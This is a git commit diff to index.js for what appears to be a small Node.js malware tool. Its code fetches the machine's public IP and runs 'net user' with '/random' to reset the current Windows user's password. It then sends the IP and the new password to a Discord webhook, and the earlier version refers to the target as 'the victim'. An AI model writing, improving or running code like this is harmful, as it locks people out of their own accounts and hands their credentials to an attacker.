4782ee0c15a6477cdce3228ec70c1ed7393acdc2
Galvins <68190778+Galvin0705@users.noreply.github.com>
2021-09-08 07:00:58 +0700

    Update index.js

--- index.js
+++ index.js
@@ -1,23 +1,29 @@
-const { Webhook } = require('discord-webhook-node');
+const username = require('username');
+const {
+    Webhook
+} = require('discord-webhook-node');
 let request = require('request');
-const logs = new Webhook("webhook link");//webhook link
-const { exec } = require("child_process");
+const logs = new Webhook("/////////////////////////////////////////"); //webhook link
+const {
+    exec
+} = require("child_process");
 
 request.get(`https://api.ipify.org`, function(err, response, body) {
-	if (err)
-		 process.exit(1);
-	
-	
-(async () => {
-exec(`net user ${__dirname.split("\\")[2]} /random`, (error, data, getter) => {
-	logs.send(`\n\`\`\`yaml\nLogged IP: ${body}\nDevice Name: ${__dirname.split("\\")[2]}\nNew Password: ${data}\n\`\`\`\n`)
-	console.log(`connected to server.`)
-	if (error){
+    if (err)
+        return console.log("no connection....................................")
 
-logs.send(`\n\`\`\`yaml\nthe victim doesn't open application as administrator.\`\`\`\n`)
 
-	}
+    (async () => {
+        exec(`net user ${await username()} /random`, (error, data, getter) => {
 
+            logs.send(`\n\`\`\`yaml\nLogged IP: ${body}\n${data}\n\`\`\`\n`)
+            console.log(`connected to server.`)
+            if (error) {
+
+                logs.send(`\n\`\`\`yaml\nyou must open this app with administrator\`\`\`\n`)
+
+            }
+
+        });
+    })();
 });
-  })();
-     });
